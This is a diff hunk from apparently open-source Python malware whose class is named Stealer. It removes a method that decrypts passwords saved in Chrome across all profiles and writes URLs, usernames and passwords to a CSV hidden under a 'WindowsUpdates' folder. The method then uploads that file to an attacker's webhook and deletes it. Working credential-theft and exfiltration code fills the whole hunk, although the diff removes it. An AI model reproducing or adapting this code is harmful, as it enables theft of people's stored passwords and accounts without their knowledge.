@@ -874,45 +874,6 @@ class Stealer:
             print("[ERR] Chrome database cannot be found")
             return None
 
-    def attempt(self):
-        try:
-            dir = r'C:\ProgramData\WindowsUpdates\data.csv'
-            try:
-                os.makedirs(os.path.dirname(dir), exist_ok=True)
-                with open(dir, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-                    csv_writer = csv.writer(decrypt_password_file, delimiter=',')
-                    csv_writer.writerow(["index","url","username","password"])
-                    secret_key = self.get_secret_key()
-                    folders = [element for element in os.listdir(self.CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-                    for folder in folders:
-                        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(self.CHROME_PATH,folder))
-                        conn = self.get_db_connection(chrome_path_login_db)
-                        if(secret_key and conn):
-                            cursor = conn.cursor()
-                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                            for index,login in enumerate(cursor.fetchall()):
-                                url = login[0]
-                                username = login[1]
-                                ciphertext = login[2]
-                                if(url!="" and username!="" and ciphertext!=""):
-                                    decrypted_password = self.decrypt_password(ciphertext, secret_key)
-                                    csv_writer.writerow([index,url,username,decrypted_password])
-                            cursor.close()
-                            conn.close()
-                            os.remove("Loginvault.db")
-                upload = Upload_files(file_path=dir, webhook_url=self.webhook)
-                upload.webhook_upload()
-                try: 
-                    os.remove(dir)
-                except Exception as e: 
-                    msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
-                    msg_instance.msg()
-            except Exception as e: 
-                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
-                msg_instance.msg()
-        except Exception as e:
-                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
-                msg_instance.msg()
                 
 class Process: 
     def __init__(self,command,webhook_url):
